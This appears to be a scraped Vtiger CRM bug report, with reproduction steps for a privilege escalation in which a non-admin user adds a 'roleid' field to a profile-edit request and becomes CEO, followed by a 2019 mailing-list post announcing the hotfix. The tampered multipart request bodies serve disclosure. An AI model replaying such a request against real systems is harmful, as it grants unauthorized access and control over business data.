=== Content from code.vtiger.com_2d0cd044_20250121_005903.html ===


[Skip to content](#content-body)
GitLab
[![](data:image/gif;base64...)](/ "Homepage")

* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)

## Admin message

Welcome to Vtiger Community. To gain access for account, please contact [ community @ vtiger.com ]

# Insufficient permission checking on "roleid" parameter during profile edition

A user without administrative privileges can modify his own "roleid" parameter containing the applicative role of the user (CEO, Vice President, Sales Manager, etc.). This is due to insufficient permission checking during profile modification.

How to reproduce:

To better illustrate this vulnerability, I created a "guest" role with the lowest permissions possible (basically no permissions).

[![1](data:image/gif;base64...)](http://code.vtiger.com/vtiger/vtigercrm/uploads/f3a9d9fda78b440989fb189e918b16d8/1.PNG)

[![2](data:image/gif;base64...)](http://code.vtiger.com/vtiger/vtigercrm/uploads/13cbf83de8fa5ebe93d28663a7f6721e/2.PNG)

[![3](data:image/gif;base64...)](http://code.vtiger.com/vtiger/vtigercrm/uploads/d7d2251e89538d81d7e82082ca41569a/3.PNG)

[![4](data:image/gif;base64...)](http://code.vtiger.com/vtiger/vtigercrm/uploads/59507b2ff60707951b6fa525cbfc8e17/4.png)

If an administrator edits the "noob" user profile, we see that the parameter "roleid" containing "H7" ("H7" for guest, "H2" for CEO, "H3" for Vice President and so on) is sent in the request and is used to specify the user's role.

```
-----------------------------5872578910825
Content-Disposition: form-data; name="last_name"

noob
-----------------------------5872578910825
Content-Disposition: form-data; name="is_admin"

0
-----------------------------5872578910825
Content-Disposition: form-data; name="roleid"

H7
-----------------------------5872578910825
Content-Disposition: form-data; name="lead_view"

Today
-----------------------------5872578910825
```

When the "noob" user edits his profile, the parameter "roleid" is absent from the request.

```
Content-Disposition: form-data; name="last_name"

noob
-----------------------------7135213064867
Content-Disposition: form-data; name="lead_view"

Today
-----------------------------7135213064867
```

However, if it is added by the user, the application accept the parameter and modifies the user's role, even if he doesn't have the required permissions to do so.

```
Content-Disposition: form-data; name="last_name"

noob
-----------------------------7135213064867
Content-Disposition: form-data; name="roleid"

H2
-----------------------------7135213064867
Content-Disposition: form-data; name="lead_view"

Today
-----------------------------7135213064867
```

[![6](data:image/gif;base64...)](http://code.vtiger.com/vtiger/vtigercrm/uploads/849bfe3a4e94d1269163b9775035044e/6.PNG)

[![5](data:image/gif;base64...)](http://code.vtiger.com/vtiger/vtigercrm/uploads/7b040f7f0b87c2586f78e1f7f0eeefde/5.PNG)

The "is\_admin" parameter is also present when the administrator edits the profile, however the permissions seems to be enforced on this one and a non admin user can't modify it.

Assignee
Loading

Time tracking
Loading

Copyright 2023 Vtiger. All rights reserved.



=== Content from lists.vtigercrm.com_95c790b4_20250121_005902.html ===

# [Vtigercrm-developers] Vtiger CRM 7.1.0 (hotfix3) Released

**Prasad**
prasad at vtiger.com

*Wed Apr 3 06:29:41 GMT 2019*

* Previous message: [[Vtigercrm-developers] Vtiger + Zapier?](037963.html)
* Next message: [[Vtigercrm-developers] Vtiger 8? vtiger.design](037965.html)
* **Messages sorted by:**
  [[ date ]](date.html#37964)
  [[ thread ]](thread.html#37964)
  [[ subject ]](subject.html#37964)
  [[ author ]](author.html#37964)

---

```
Dear members,

Vtiger 7.1.0 (Hotfix3) is now available.

Download hotfix: vtigercrm7.1.0-hotfix3.zip
<<https://sourceforge.net/projects/vtigercrm/files/vtiger%20CRM%207.1.0/Core%20Product/Hotfixes/vtigercrm7.1.0-hotfix3.zip/download>>

This patch addresses the following:

   1. Possibility of SQL injection by authenticated user.
   2. Insufficient permission checking on "roleid" parameter during profile
   edition <<http://code.vtiger.com/vtiger/vtigercrm/issues/1126>>

Thanks to Mohnish Dhage and Samuel De Grace for sharing details to help us
get to root-cause and devise the fix.

NOTE:

   1. We have patched the 7.1.0 files
   <<https://sourceforge.net/projects/vtigercrm/files/vtiger%20CRM%207.1.0/>> -
   so new downloads doesn't need hotfixes.
   2. We recommend you to patch older version (refer commit-1
   <<http://code.vtiger.com/vtiger/vtigercrm/commit/1e64f796bbef9b1abbed5195893422e7dd43d5b9>>
   and commit-2
   <<http://code.vtiger.com/vtiger/vtigercrm/commit/85d90cc9f129a554524eab2e9e3d44c20756393f>>
)
   or migrate to 7.1.0

If you have more questions please feel free to discuss on this thread.

Regards,
Prasad
Vtiger Team
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <<http://lists.vtigercrm.com/pipermail/vtigercrm-developers/attachments/20190403/203c2621/attachment.html>>

```

---

* Previous message: [[Vtigercrm-developers] Vtiger + Zapier?](037963.html)
* Next message: [[Vtigercrm-developers] Vtiger 8? vtiger.design](037965.html)
* **Messages sorted by:**
  [[ date ]](date.html#37964)
  [[ thread ]](thread.html#37964)
  [[ subject ]](subject.html#37964)
  [[ author ]](author.html#37964)

---

[More information about the vtigercrm-developers
mailing list](http://lists.vtigercrm.com/cgi-bin/mailman/listinfo/vtigercrm-developers)


